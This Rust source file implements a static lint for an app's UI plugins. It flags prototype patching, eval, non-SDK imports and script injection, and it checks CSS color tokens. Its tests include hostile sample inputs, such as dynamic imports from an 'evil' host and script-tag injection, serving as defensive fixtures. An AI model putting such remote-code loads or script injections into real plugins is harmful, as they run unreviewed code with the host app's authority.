//! The static lint a UX plugin's module must pass at `gents pack check`
//! and `gents pack build`: an honest-author tripwire, not a sandbox. A
//! plugin runs in the webview with the app's authority; the webview's CSP
//! (`script-src 'self' blob:`) is what keeps a module from loading code the
//! loader did not hand it. What is refused here is the set of things a
//! reviewer should never have to look for: reaching into the app through
//! prototypes, evaluating a second stage, importing anything but the SDK,
//! injecting script tags.
//!
//! One pass tokenizes the source into two byte-for-byte haystacks: `code`,
//! where comments, string contents and regex literals are blanked, so a
//! plugin's help text may mention `eval` and a sanitizer may match
//! `/<script/`; and `text`, where strings stay, because an import specifier
//! and the payload of an `innerHTML` write are strings the rule must read.
//! A template literal's `${…}` is code in both.
//!
//! Colors are the other half: a page has to read in the light and dark themes,
//! and the frame re-themes by changing what its custom properties resolve to.
//! So a plugin's CSS and the CSS strings in its module may not name a custom
//! property the frame does not define (`--background` paints nothing and no
//! fallback saves it in dark mode) and may not write a color by value. The
//! defined set is `reference::frame_tokens`, generated from the frame's built
//! stylesheet, plus whatever the plugin declares for itself.

use rapidhash::{HashSetExt, RapidHashSet};
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::ops::Range;
use std::sync::LazyLock;

use super::reference;

/// One rule hit: which rule, on which line.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Finding {
    pub rule: &'static str,
    pub line: usize,
    /// The offending text, trimmed to one line.
    pub excerpt: String,
    /// The finding is in the plugin's stylesheet, not its module.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub stylesheet: bool,
}

struct Rule {
    name: &'static str,
    pattern: &'static str,
    /// Matched against the haystack that keeps strings.
    reads_strings: bool,
}

const RULES: &[Rule] = &[
    Rule {
        name: "prototype patching",
        pattern: r"\b[A-Za-z_$][\w$]*\.prototype\.[\w$]+\s*=[^=]",
        reads_strings: false,
    },
    Rule {
        name: "prototype patching",
        pattern: r"\bObject\.definePropert(?:y|ies)\(\s*[\w$.]+\.prototype\b",
        reads_strings: false,
    },
    Rule {
        name: "prototype patching",
        pattern: r"\b(?:Reflect|Object)\.setPrototypeOf\(|\.__proto__\s*=",
        reads_strings: false,
    },
    Rule {
        name: "dynamic code",
        pattern: r"(?:^|[^\w$.])eval\(|\bnew\s+Function\(",
        reads_strings: false,
    },
    Rule {
        // every dynamic import, through its closing paren; the SDK ones are
        // let through by `is_sdk_import` (the regex crate has no lookahead)
        name: "non-sdk import",
        pattern: r"\bimport\s*\([^)]*\)?",
        reads_strings: true,
    },
    Rule {
        // every static import and re-export with a specifier; the SDK ones
        // are let through by `is_sdk_import`
        name: "non-sdk import",
        pattern: r#"\b(?:import|export)\s+(?:[^;'"`]*?\bfrom\s*)?['"][^'"\n]*['"]"#,
        reads_strings: true,
    },
    Rule {
        name: "script injection",
        pattern: r#"createElement\(\s*['"]script['"]\s*\)|<script\b"#,
        reads_strings: true,
    },
];

static COMPILED: LazyLock<Vec<(&'static Rule, Regex)>> = LazyLock::new(|| {
    RULES
        .iter()
        .map(|rule| {
            (
                rule,
                Regex::new(rule.pattern).expect("a lint rule is a valid regex"),
            )
        })
        .collect()
});

/// What a plugin may import, static or dynamic: the SDK and the React the
/// app runs. The same list the desktop loader rewrites to its shims.
pub const SDK_SPECIFIERS: &[&str] = &["@gents/ux-sdk", "react", "react/jsx-runtime"];

static QUOTED_SPECIFIER: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"['"]([^'"\n]*)['"]"#).unwrap());

/* an import match is fine when its one specifier is an SDK name and, for a
dynamic import, that literal is the whole argument */
fn is_sdk_import(matched: &str) -> bool {
    let Some(caps) = QUOTED_SPECIFIER.captures(matched) else {
        return false;
    };
    let specifier = &caps[1];
    if !SDK_SPECIFIERS.contains(&specifier) {
        return false;
    }
    if !matched.trim_start().starts_with("import") || !matched.contains('(') {
        return true;
    }
    let inside = matched
        .split_once('(')
        .map(|(_, rest)| rest.trim_end_matches(')').trim())
        .unwrap_or("");
    inside == caps.get(0).map(|m| m.as_str()).unwrap_or("")
}

/// The source as two haystacks of the same byte length and line breaks.
struct Masked {
    /// Comments, string contents and regex literals blanked.
    code: String,
    /// Comments and regex literals blanked; strings kept.
    text: String,
    /// Where each string's contents and each stretch of template text lie.
    strings: Vec<Range<usize>>,
}

enum Frame {
    /// Inside a template literal's text.
    Template,
    /// Inside a `${…}` of a template, `depth` braces deep.
    Expr { depth: usize },
}

/* words after which a `/` opens a regex literal rather than dividing */
const REGEX_AFTER_WORDS: &[&str] = &[
    "return",
    "typeof",
    "instanceof",
    "in",
    "of",
    "new",
    "delete",
    "void",
    "throw",
    "case",
    "do",
    "else",
    "yield",
    "await",
];

fn mask(source: &str) -> Masked {
    let bytes = source.as_bytes();
    let n = bytes.len();
    let mut code = Vec::with_capacity(n);
    let mut text = Vec::with_capacity(n);
    let mut frames: Vec<Frame> = Vec::new();
    let mut strings: Vec<Range<usize>> = Vec::new();
    /* where the template text being read began; an `${}` between two
    stretches resets it, so one position serves every nesting depth */
    let mut template_text = 0;
    /* the last byte of code emitted that was not whitespace, and the word
    it ended, for the regex-or-division decision */
    let mut prev: Option<u8> = None;
    let mut word = String::new();
    /* set when a slash that could open a regex found no close on its line:
    the rest of the line divides, without a rescan per slash, so a line of
    slashes costs one pass; code stays code, which only adds findings */
    let mut dead_line = false;
    let blank_both = |code: &mut Vec<u8>, text: &mut Vec<u8>, b: u8| {
        let out = if b == b'\n' { b'\n' } else { b' ' };
        code.push(out);
        text.push(out);
    };
    let mut i = 0;
    while i < n {
        let b = bytes[i];
        if b == b'\n' {
            dead_line = false;
        }
        if matches!(frames.last(), Some(Frame::Template)) {
            /* template text: blanked in code, kept in text, until a `${`
            opens an expression or the backtick closes it */
            match b {
                b'\\' if i + 1 < n => {
                    code.push(b' ');
                    code.push(if bytes[i + 1] == b'\n' { b'\n' } else { b' ' });
                    text.push(b);
                    text.push(bytes[i + 1]);
                    i += 2;
                }
                b'$' if i + 1 < n && bytes[i + 1] == b'{' => {
                    strings.push(template_text..i);
                    code.extend_from_slice(b"${");
                    text.extend_from_slice(b"${");
                    frames.push(Frame::Expr { depth: 0 });
                    prev = Some(b'{');
                    word.clear();
                    i += 2;
                }
                b'`' => {
                    strings.push(template_text..i);
                    code.push(b);
                    text.push(b);
                    frames.pop();
                    prev = Some(b']');
                    word.clear();
                    i += 1;
                }
                _ => {
                    code.push(if b == b'\n' { b'\n' } else { b' ' });
                    text.push(b);
                    i += 1;
                }
            }
            continue;
        }
        /* code */
        match b {
            b'/' if i + 1 < n && bytes[i + 1] == b'/' => {
                while i < n && bytes[i] != b'\n' {
                    blank_both(&mut code, &mut text, bytes[i]);
                    i += 1;
                }
            }
            b'/' if i + 1 < n && bytes[i + 1] == b'*' => {
                let close = source[i + 2..].find("*/").map_or(n, |at| i + 2 + at + 2);
                while i < close {
                    blank_both(&mut code, &mut text, bytes[i]);
                    i += 1;
                }
            }
            b'"' | b'\'' => {
                code.push(b);
                text.push(b);
                i += 1;
                let contents = i;
                while i < n && bytes[i] != b && bytes[i] != b'\n' {
                    let take = if bytes[i] == b'\\' && i + 1 < n { 2 } else { 1 };
                    for k in 0..take {
                        let c = bytes[i + k];
                        code.push(if c == b'\n' { b'\n' } else { b' ' });
                        text.push(c);
                    }
                    i += take;
                }
                strings.push(contents..i.min(n));
                if i < n && bytes[i] == b {
                    code.push(b);
                    text.push(b);
                    i += 1;
                }
                /* a string is a value: a `/` after it divides */
                prev = Some(b']');
                word.clear();
            }
            b'`' => {
                code.push(b);
                text.push(b);
                frames.push(Frame::Template);
                i += 1;
                template_text = i;
            }
            b'/' => {
                let opens = !dead_line
                    && match prev {
                        None => true,
                        Some(p) if p.is_ascii_alphanumeric() || p == b'_' || p == b'$' => {
                            REGEX_AFTER_WORDS.contains(&word.as_str())
                        }
                        Some(b')') | Some(b']') => false,
                        Some(_) => true,
                    };
                let end = opens.then(|| regex_end(bytes, i)).flatten();
                match end {
                    Some(end) => {
                        while i < end {
                            blank_both(&mut code, &mut text, bytes[i]);
                            i += 1;
                        }
                        prev = Some(b']');
                        word.clear();
                    }
                    None => {
                        dead_line |= opens;
                        code.push(b);
                        text.push(b);
                        prev = Some(b);
                        word.clear();
                        i += 1;
                    }
                }
            }
            b'{' | b'}' if matches!(frames.last(), Some(Frame::Expr { .. })) => {
                code.push(b);
                text.push(b);
                if let Some(Frame::Expr { depth }) = frames.last_mut() {
                    if b == b'{' {
                        *depth += 1;
                    } else if *depth == 0 {
                        frames.pop();
                        template_text = i + 1;
                    } else {
                        *depth -= 1;
                    }
                }
                prev = Some(b);
                word.clear();
                i += 1;
            }
            _ => {
                code.push(b);
                text.push(b);
                if !b.is_ascii_whitespace() {
                    prev = Some(b);
                    if b.is_ascii_alphanumeric() || b == b'_' || b == b'$' {
                        word.push(b as char);
                    } else {
                        word.clear();
                    }
                }
                i += 1;
            }
        }
    }
    let lossless = |out: Vec<u8>| match String::from_utf8(out) {
        Ok(s) => s,
        Err(e) => String::from_utf8_lossy(e.as_bytes()).into_owned(),
    };
    Masked {
        code: lossless(code),
        text: lossless(text),
        strings,
    }
}

/* the byte after a regex literal that opens at `slash`, or `None` when the
line ends first (then the slash divides): one scan, never a rescan */
fn regex_end(bytes: &[u8], slash: usize) -> Option<usize> {
    let mut j = slash + 1;
    let mut in_class = false;
    while j < bytes.len() {
        match bytes[j] {
            b'\\' if j + 1 < bytes.len() && bytes[j + 1] != b'\n' => j += 2,
            b'\\' | b'\n' => return None,
            b'[' => {
                in_class = true;
                j += 1;
            }
            b']' => {
                in_class = false;
                j += 1;
            }
            b'/' if !in_class => {
                j += 1;
                while j < bytes.len() && bytes[j].is_ascii_alphabetic() {
                    j += 1;
                }
                return Some(j);
            }
            _ => j += 1,
        }
    }
    None
}

const RAW_COLOR: &str = "raw color";
const UNDEFINED_TOKEN: &str = "undefined css token";

/// What to do about a color finding, named with tokens the frame defines.
const TOKEN_HINT: &str = "use a frame token instead of the color, such as var(--text), \
var(--text-muted), var(--bg), var(--card), var(--border), var(--primary), \
var(--destructive) or var(--chart-1) (--background and --foreground do not exist); \
the SDK reference lists them all";

static FRAME_TOKENS: LazyLock<RapidHashSet<&'static str>> =
    LazyLock::new(|| reference::frame_tokens().collect());

static VAR_REFERENCE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\bvar\(\s*(--[\w-]+)").unwrap());
static TOKEN_READ: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"\bgetPropertyValue\(\s*['"](--[\w-]+)['"]"#).unwrap());
/* `--name:` inside CSS text */
static CUSTOM_DECLARATION: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(--[\w-]+)\s*:").unwrap());
/* `{ '--name': … }` and `setProperty('--name', …)` in a module */
static CUSTOM_SETTER: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:['"](--[\w-]+)['"]\s*\]?\s*:|\bsetProperty\(\s*['"](--[\w-]+)['"])"#).unwrap()
});
static HEX_COLOR: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"#[0-9a-fA-F]{3,8}\b").unwrap());
/* a numeric first argument, so prose such as "lab(s)" is left alone */
static COLOR_FUNCTION: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\b(?:rgba?|hsla?|hwb|oklch|oklab|lab|lch)\(\s*[\d.+-]").unwrap());
/* a string a hex value in is a color rather than an issue number: it sets a
color-taking property or attribute, or draws a gradient */
static SETS_A_COLOR: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?i)(?:^|[;{\s'"])[a-z-]*(?:color|background|border|fill|stroke|outline|shadow)[a-z-]*\s*[:=]|gradient\("#,
    )
    .unwrap()
});

/* the lengths a hex color can have; `#abcde` is not one */
fn is_hex_color(token: &str) -> bool {
    matches!(token.len(), 4 | 5 | 7 | 9)
}

/* a string that is nothing but a hex value, unless a selector API took it */
fn is_whole_hex_color(contents: &str, before: &str) -> bool {
    let trimmed = contents.trim();
    let before = before.trim_end_matches(['\'', '"', '`']).trim_end();
    let takes_a_selector = [
        "querySelector(",
        "querySelectorAll(",
        "closest(",
        "matches(",
    ]
    .iter()
    .any(|call| before.ends_with(call));
    HEX_COLOR
        .find(trimmed)
        .is_some_and(|m| m.len() == trimmed.len())
        && is_hex_color(trimmed)
        && !takes_a_selector
}

struct Sink<'a> {
    source: &'a str,
    stylesheet: bool,
    findings: &'a mut Vec<Finding>,
}

impl Sink<'_> {
    fn push(&mut self, rule: &'static str, offset: usize) {
        let line = self.source[..offset].matches('\n').count() + 1;
        let excerpt = self
            .source
            .lines()
            .nth(line - 1)
            .unwrap_or("")
            .trim()
            .chars()
            .take(120)
            .collect();
        self.findings.push(Finding {
            rule,
            line,
            excerpt,
            stylesheet: self.stylesheet,
        });
    }

    fn check_references(&mut self, haystack: &str, base: usize, declared: &RapidHashSet<String>) {
        for caps in VAR_REFERENCE.captures_iter(haystack) {
            let name = caps.get(1).expect("the group is not optional");
            if !FRAME_TOKENS.contains(name.as_str()) && !declared.contains(name.as_str()) {
                self.push(UNDEFINED_TOKEN, base + name.start());
            }
        }
    }

    fn check_colors(&mut self, haystack: &str, base: usize, hex: bool) {
        for m in COLOR_FUNCTION.find_iter(haystack) {
            self.push(RAW_COLOR, base + m.start());
        }
        if hex {
            for m in HEX_COLOR.find_iter(haystack) {
                let in_url = haystack[..m.start()].trim_end().ends_with("url(");
                if is_hex_color(m.as_str()) && !in_url {
                    self.push(RAW_COLOR, base + m.start());
                }
            }
        }
    }
}

/// The module's CSS strings, read for tokens and colors.
fn lint_module_css(
    source: &str,
    masked: &Masked,
    declared: &RapidHashSet<String>,
    findings: &mut Vec<Finding>,
) {
    let mut sink = Sink {
        source,
        stylesheet: false,
        findings,
    };
    for caps in TOKEN_READ.captures_iter(&masked.text) {
        let name = caps.get(1).expect("the group is not optional");
        if !FRAME_TOKENS.contains(name.as_str()) && !declared.contains(name.as_str()) {
            sink.push(UNDEFINED_TOKEN, name.start());
        }
    }
    for range in &masked.strings {
        let contents = &masked.text[range.clone()];
        sink.check_references(contents, range.start, declared);
        if is_whole_hex_color(contents, &masked.text[..range.start]) {
            sink.push(RAW_COLOR, range.start);
        } else {
            sink.check_colors(contents, range.start, SETS_A_COLOR.is_match(contents));
        }
    }
}

/* blanks comments, string contents and url() contents, keeping every byte
offset and line break */
fn mask_css(css: &str) -> String {
    let bytes = css.as_bytes();
    let mut out = bytes.to_vec();
    let blank = |out: &mut [u8], range: Range<usize>| {
        for byte in &mut out[range] {
            if *byte != b'\n' {
                *byte = b' ';
            }
        }
    };
    /* bytes, not chars: the walk steps through multi-byte text one at a time */
    let mut i = 0;
    while i < bytes.len() {
        let rest = &bytes[i..];
        if rest.starts_with(b"/*") {
            let end = rest[2..]
                .windows(2)
                .position(|pair| pair == b"*/")
                .map_or(bytes.len(), |at| i + 2 + at + 2);
            blank(&mut out, i..end);
            i = end;
        } else if rest.starts_with(b"url(") {
            let end = rest
                .iter()
                .position(|byte| *byte == b')')
                .map_or(bytes.len(), |at| i + at);
            blank(&mut out, i + 4..end);
            i = end;
        } else if bytes[i] == b'"' || bytes[i] == b'\'' {
            let quote = bytes[i];
            let mut j = i + 1;
            while j < bytes.len() && bytes[j] != quote && bytes[j] != b'\n' {
                j += if bytes[j] == b'\\' { 2 } else { 1 };
            }
            let end = j.min(bytes.len());
            blank(&mut out, i + 1..end);
            i = end + 1;
        } else {
            i += 1;
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

/* a `name: value` statement, with the offset of its value */
fn css_declaration(text: &str, base: usize) -> Option<(&str, usize, &str)> {
    let (name, value) = text.split_once(':')?;
    Some((name.trim(), base + name.len() + 1, value))
}

/* each `name: value` in a stylesheet; a run of text that ends in `{` is a
selector or an at-rule's prelude, so a `#id` or a `:hover` never reads as one */
fn css_declarations(masked: &str) -> Vec<(&str, usize, &str)> {
    let mut declarations = Vec::new();
    let mut start = 0;
    for (i, byte) in masked.bytes().enumerate() {
        match byte {
            b'{' => start = i + 1,
            b';' | b'}' => {
                declarations.extend(css_declaration(&masked[start..i], start));
                start = i + 1;
            }
            _ => {}
        }
    }
    declarations.extend(css_declaration(&masked[start..], start));
    declarations
}

fn lint_stylesheet(
    css: &str,
    masked: &str,
    declared: &RapidHashSet<String>,
    findings: &mut Vec<Finding>,
) {
    let mut sink = Sink {
        source: css,
        stylesheet: true,
        findings,
    };
    for (_, base, value) in css_declarations(masked) {
        sink.check_references(value, base, declared);
        sink.check_colors(value, base, true);
    }
}

/// The lint findings for one module's source; empty means admitted.
pub fn lint(source: &str) -> Vec<Finding> {
    lint_plugin(source, None)
}

/// The lint findings for a plugin's module and its stylesheet, which share a
/// frame, so a custom property either of them declares is defined for both.
pub fn lint_plugin(source: &str, css: Option<&str>) -> Vec<Finding> {
    let masked = mask(source);
    let mut findings = Vec::new();
    for (rule, re) in COMPILED.iter() {
        let haystack = if rule.reads_strings {
            &masked.text
        } else {
            &masked.code
        };
        for m in re.find_iter(haystack) {
            if rule.name == "non-sdk import" && is_sdk_import(m.as_str()) {
                continue;
            }
            let line = haystack[..m.start()].matches('\n').count() + 1;
            let excerpt = source
                .lines()
                .nth(line - 1)
                .unwrap_or("")
                .trim()
                .chars()
                .take(120)
                .collect();
            findings.push(Finding {
                rule: rule.name,
                line,
                excerpt,
                stylesheet: false,
            });
        }
    }
    let mut declared: RapidHashSet<String> = RapidHashSet::new();
    let masked_css = css.map(mask_css);
    if let Some(masked_css) = &masked_css {
        declared.extend(
            css_declarations(masked_css)
                .into_iter()
                .filter(|(name, _, _)| name.starts_with("--"))
                .map(|(name, _, _)| name.to_owned()),
        );
    }
    for caps in CUSTOM_SETTER.captures_iter(&masked.text) {
        declared.extend(
            caps.iter()
                .skip(1)
                .flatten()
                .map(|name| name.as_str().to_owned()),
        );
    }
    for range in &masked.strings {
        for caps in CUSTOM_DECLARATION.captures_iter(&masked.text[range.clone()]) {
            declared.insert(caps[1].to_owned());
        }
    }
    lint_module_css(source, &masked, &declared, &mut findings);
    if let (Some(css), Some(masked_css)) = (css, &masked_css) {
        lint_stylesheet(css, masked_css, &declared, &mut findings);
    }
    findings.sort_by_key(|f| (f.stylesheet, f.line, f.rule));
    findings.dedup();
    findings
}

/// One sentence per finding, for a report or an error, and what to do about
/// a color when there is one.
pub fn describe(findings: &[Finding]) -> String {
    let mut lines: Vec<String> = findings
        .iter()
        .map(|f| {
            let place = if f.stylesheet {
                "stylesheet line"
            } else {
                "line"
            };
            format!("{place} {}: {} ({})", f.line, f.rule, f.excerpt)
        })
        .collect();
    if findings
        .iter()
        .any(|f| f.rule == RAW_COLOR || f.rule == UNDEFINED_TOKEN)
    {
        lines.push(TOKEN_HINT.to_owned());
    }
    lines.join("\n")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules(source: &str) -> Vec<&'static str> {
        lint(source).into_iter().map(|f| f.rule).collect()
    }

    #[test]
    fn a_clean_sdk_plugin_is_admitted() {
        let source = r#"
import { NAV_AREA, Button } from '@gents/ux-sdk'
import { jsx } from 'react/jsx-runtime'
import { useState } from 'react'
// eval is mentioned in this comment only
const help = "never call eval( in a plugin"
const re = /<script/i
export default { id: 'ok', register(ctx) { ctx.register({ id: 'x', area: NAV_AREA, data: {} }) } }
"#;
        assert_eq!(
            rules(source),
            Vec::<&str>::new(),
            "{}",
            describe(&lint(source))
        );
    }

    #[test]
    fn each_forbidden_shape_is_named() {
        assert_eq!(
            rules("Array.prototype.map = () => 1"),
            vec!["prototype patching"]
        );
        assert_eq!(
            rules("Object.defineProperty(X.prototype, 'y', {})"),
            vec!["prototype patching"]
        );
        assert_eq!(
            rules("Object.setPrototypeOf(a, b)"),
            vec!["prototype patching"]
        );
        assert_eq!(rules("eval('1')"), vec!["dynamic code"]);
        assert_eq!(
            rules("const f = new Function('return 1')"),
            vec!["dynamic code"]
        );
        assert_eq!(rules("import('https://evil/x.js')"), vec!["non-sdk import"]);
        assert_eq!(rules("import(someVar)"), vec!["non-sdk import"]);
        assert_eq!(
            rules("import x from 'https://cdn/x.js'"),
            vec!["non-sdk import"]
        );
        assert_eq!(rules("import x from 'lodash'"), vec!["non-sdk import"]);
        assert_eq!(rules("export * from 'lodash'"), vec!["non-sdk import"]);
        assert_eq!(
            rules("document.createElement('script')"),
            vec!["script injection"]
        );
        assert_eq!(
            rules("el.innerHTML = `<script>`"),
            vec!["script injection"],
            "markup in a string is the payload of an innerHTML write"
        );
        assert_eq!(
            rules("const re = /<script[\\s\\S]*?<\\/script>/gi; html.replace(re, '')"),
            Vec::<&str>::new(),
            "a sanitizer's regex literal matches markup, it cannot inject any"
        );
    }

    /// Each shape that once slipped past: a `/` after a string divides
    /// (the regex mask may not swallow the code after it); a template's
    /// `${}` is code; a string may not open a comment; a dynamic import's
    /// argument must be the SDK literal alone; a comment between `from` and
    /// the specifier is nothing; a specifier may not borrow the other quote.
    #[test]
    fn masking_does_not_hide_code() {
        assert_eq!(
            rules("const n = \"8\" / 2; eval(x); const re = /x/"),
            vec!["dynamic code"]
        );
        assert_eq!(rules("const s = `${eval(x)}`"), vec!["dynamic code"]);
        assert_eq!(
            rules("const s = `a ${ `b ${eval(x)}` } c`"),
            vec!["dynamic code"],
            "nested templates"
        );
        assert_eq!(rules("const a = \"a //\"; eval(x)"), vec!["dynamic code"]);
        assert_eq!(
            rules("const a = \"/*\"; eval(x); const b = \"*/\""),
            vec!["dynamic code"]
        );
        assert_eq!(rules("import('react' + x)"), vec!["non-sdk import"]);
        assert_eq!(rules("import(`react`)"), vec!["non-sdk import"]);
        assert_eq!(
            rules("import x from/**/'https://evil/s.js'"),
            vec!["non-sdk import"]
        );
        assert_eq!(
            rules("import x from \"https://evil/s.js?'\""),
            vec!["non-sdk import"]
        );
        assert_eq!(
            rules("const t = 'eval(' ; const u = `eval(`"),
            Vec::<&str>::new()
        );
        assert_eq!(
            rules("// eval(\nreturn /eval(/.test(x)"),
            Vec::<&str>::new()
        );
    }

    /// Both haystacks keep every byte offset and line break, so a finding
    /// after a non-ASCII string lands on its own line.
    #[test]
    fn findings_after_non_ascii_text_keep_their_line() {
        let f = lint(
            "const s = \"ééééééééééé\";\nconst t = `日本語 ${1}`;\nel.innerHTML = '<script>'\n",
        );
        assert_eq!(f.len(), 1, "{}", describe(&f));
        assert_eq!(f[0].rule, "script injection");
        assert_eq!(f[0].line, 3);
    }

    /// An unclosed character class on a long line is one pass, not one per
    /// slash.
    #[test]
    fn an_unclosed_regex_is_scanned_once() {
        let source = "/[ ".repeat(200_000);
        let started = std::time::Instant::now();
        let _ = lint(&source);
        assert!(started.elapsed() < std::time::Duration::from_secs(2));
    }

    #[test]
    fn sdk_dynamic_imports_are_fine() {
        assert_eq!(rules("await import('@gents/ux-sdk')"), Vec::<&str>::new());
        assert_eq!(
            rules("await import('react/jsx-runtime')"),
            Vec::<&str>::new()
        );
    }

    fn css_rules(source: &str, css: &str) -> Vec<&'static str> {
        lint_plugin(source, Some(css))
            .into_iter()
            .map(|f| f.rule)
            .collect()
    }

    /// The names a dark-mode bug actually used, and the ones it should have.
    #[test]
    fn a_token_the_frame_does_not_define_is_refused() {
        assert_eq!(
            css_rules("", ".a { color: var(--background); }"),
            vec![UNDEFINED_TOKEN]
        );
        assert_eq!(
            css_rules("", ".a { color: var(--foreground, red); }"),
            vec![UNDEFINED_TOKEN],
            "a fallback does not make the token exist"
        );
        assert_eq!(
            css_rules("", ".a { color: var(--text); background: var(--bg); }"),
            Vec::<&str>::new()
        );
        assert_eq!(
            rules("const c = 'var(--background)'"),
            vec![UNDEFINED_TOKEN]
        );
        assert_eq!(
            rules("const c = `linear-gradient(var(--text), var(--nope))`"),
            vec![UNDEFINED_TOKEN]
        );
        assert_eq!(
            rules("const v = el.style.getPropertyValue('--background')"),
            vec![UNDEFINED_TOKEN]
        );
        assert_eq!(rules("const c = 'var(--text)'"), Vec::<&str>::new());
        assert_eq!(
            rules("const a = '// var(--nope)'"),
            vec![UNDEFINED_TOKEN],
            "a string is read as a string"
        );
        assert_eq!(rules("// var(--nope)\n"), Vec::<&str>::new());
    }

    #[test]
    fn a_custom_property_the_plugin_declares_is_defined() {
        assert_eq!(
            css_rules("", ".a { --mine: 2px; width: var(--mine); }"),
            Vec::<&str>::new()
        );
        assert_eq!(
            css_rules(
                "jsx('div', { style: { '--pct': '40%' } })",
                ".bar { width: var(--pct); }"
            ),
            Vec::<&str>::new(),
            "the module sets it, the stylesheet reads it"
        );
        assert_eq!(
            css_rules(
                "el.style.setProperty('--w', '1px')",
                ".a { width: var(--w); }"
            ),
            Vec::<&str>::new()
        );
        assert_eq!(
            rules("const css = `.a { --mine: 2px; width: var(--mine); }`"),
            Vec::<&str>::new()
        );
    }

    #[test]
    fn raw_colors_are_refused_in_a_stylesheet() {
        for value in [
            ".a { color: #fff; }",
            ".a { color: #AABBCC }",
            ".a { background: linear-gradient(#000, #fff) }",
            ".a { border: 1px solid rgb(1, 2, 3); }",
            ".a { color: rgba(0,0,0,.5); }",
            ".a { color: hsl(210 50% 40%); }",
            ".a { color: oklch(0.5 0.1 200); }",
            ".a { --mine: #123456; }",
            "@media (min-width: 1px) { .a:hover { color: #abc; } }",
        ] {
            assert_eq!(css_rules("", value), vec![RAW_COLOR], "{value}");
        }
    }

    #[test]
    fn raw_colors_are_refused_in_module_strings() {
        assert_eq!(rules("const c = '#fff'"), vec![RAW_COLOR]);
        assert_eq!(rules("jsx('rect', { fill: '#3b82f6' })"), vec![RAW_COLOR]);
        assert_eq!(rules("const c = 'rgb(1, 2, 3)'"), vec![RAW_COLOR]);
        assert_eq!(rules("const c = `color: #fff;`"), vec![RAW_COLOR]);
        assert_eq!(
            rules("const c = `background-color: #AABBCC`"),
            vec![RAW_COLOR]
        );
        assert_eq!(
            rules(r##"el.innerHTML = '<svg fill="#fff" />'"##),
            vec![RAW_COLOR]
        );
        assert_eq!(
            rules("const g = 'linear-gradient(90deg, #000, #fff)'"),
            vec![RAW_COLOR],
            "one finding per rule per line"
        );
        assert_eq!(rules("const s = `x ${'#fff'} y`"), vec![RAW_COLOR]);
    }

    /// Text shaped like a color that is not one: the lint must not make a
    /// plugin rewrite an issue number or an element id.
    #[test]
    fn hex_shaped_text_that_is_no_color_is_left_alone() {
        for source in [
            "const t = 'issue #123 is open'",
            "const t = `Background job #123`",
            "document.querySelector('#add')",
            "root.querySelectorAll( '#abc' )",
            "class A { #abc = 1; f() { return this.#abc } }",
            "// #fff in a comment\n",
            "const u = 'https://example.test/#abc'",
            "const s = 'see lab(s) and rgb results'",
            "const i = 'url(#abc)'",
        ] {
            assert_eq!(rules(source), Vec::<&str>::new(), "{source}");
        }
        assert_eq!(
            css_rules(
                "",
                "#add { color: var(--text); }\n\
                 /* #fff */\n\
                 .a:hover { fill: url(#abc); content: '#fff'; }"
            ),
            Vec::<&str>::new()
        );
        assert_eq!(css_rules("", ".a { color: #abcde; }"), Vec::<&str>::new());
    }

    #[test]
    fn a_stylesheet_finding_says_where_it_is_and_what_to_do() {
        let findings = lint_plugin("", Some(".a {}\n.b { color: #fff; }\n"));
        assert_eq!(findings.len(), 1);
        assert!(findings[0].stylesheet);
        assert_eq!(findings[0].line, 2);
        let described = describe(&findings);
        assert!(
            described.starts_with("stylesheet line 2: raw color"),
            "{described}"
        );
        assert!(described.contains("var(--text)"), "{described}");
        assert!(!describe(&lint("eval('1')")).contains("var(--text)"));
    }

    /// The stylesheet walk steps byte by byte; text outside ASCII may not
    /// land it on a char boundary it then slices at.
    #[test]
    fn a_stylesheet_with_non_ascii_text_keeps_its_lines() {
        let css = ".été { color: var(--text); } /* é */\n.b { content: 'é'; color: #fff; }\n";
        let findings = lint_plugin("", Some(css));
        assert_eq!(findings.len(), 1, "{}", describe(&findings));
        assert_eq!(findings[0].rule, RAW_COLOR);
        assert_eq!(findings[0].line, 2);
    }

    /// The hint can only recommend what the lint would admit.
    #[test]
    fn the_hint_names_tokens_that_exist() {
        let named: Vec<&str> = VAR_REFERENCE
            .captures_iter(TOKEN_HINT)
            .map(|caps| caps.get(1).unwrap().as_str())
            .collect();
        assert!(!named.is_empty());
        for token in named {
            assert!(FRAME_TOKENS.contains(token), "{token}");
        }
        assert!(!FRAME_TOKENS.contains("--background"));
        assert!(!FRAME_TOKENS.contains("--foreground"));
    }

    #[test]
    fn findings_carry_the_line() {
        let f = lint("ok()\n\nObject.setPrototypeOf(a, b)\n");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].line, 3);
        assert!(f[0].excerpt.contains("setPrototypeOf"));
    }
}
